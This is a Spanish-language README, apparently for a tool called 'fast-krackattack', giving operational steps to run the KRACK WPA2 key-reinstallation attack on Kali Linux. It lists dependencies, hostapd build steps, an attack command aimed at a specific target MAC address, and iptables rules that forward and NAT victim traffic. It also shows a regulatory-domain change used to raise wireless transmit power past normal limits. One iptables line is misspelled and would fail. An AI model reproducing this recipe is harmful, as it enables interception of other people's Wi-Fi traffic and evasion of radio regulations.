# fast-krackattack
Basado en el ataque de Krackattacks de Vanhoef y Piessens, se realizó mejora en velocidad y estabilidad del ataque
La forma probada de realizar el ataque de krackattacks de forma estable, rápida y exitosa es corriendo en kali linux.2 (2019), arrancando en modo USB y sin conexión a internet.

Una vez que ha cargado en modo live, se instalas las siguientes dependencias:

apt-get install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python-scapy python-pycryptodome

Nota: Cabe indicar que la instalación de las dependencias no debe superar los 9 MB, si es superior el tamaño de la instalación debe iniciar de nuevo el proceso.

Al realizar con éxito la instalación de las dependencias se configura los siguientes archivos:

enable_internet_forwarding y hostapd.conf

La configuración requiere ingresar los nombres de las interfaces inalámbricas reconocidas en kali linux.

Por último nos dirigimos a la carpeta hostapd y compilamos:

 cd hostapd
  cp defconfig .config
  make -j 2
  
<Para realizar el ataque desactivamos el administrador de red con el siguiente comando:

service Networkmanager stop

Procedemos a escribir el script del ataque, por ejemplo:

./krack-all-zero-tk wlan2 wlan1 HackAdvanced -t a4:93:3f:62:37:7b -d

Con este ataque podemos visualizar con wireshark como las tramas eapol van trabajando hasta tener los mensajes 4 cifrados y sin cifrar y obtener el keystream. Se recomienda activar todas las interfaces de wireshark.

También sirve para la instalación de clave todo en cero.

Para la configuración de las tablas de ruteo para salida del internet se escribe el siguiente script:

iptables -F
iptables -t nat -F
iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUEREDE

Para incrementar la potencia de las tajetas inalámbricas escribimos el siguiente script:

sudo iw reg set GY
sudo ip link set wlan1 down
sudo iw dev wlan1 set txpower fixed 30mBm
sudo ip link set wlan1 up
sudo iw dev



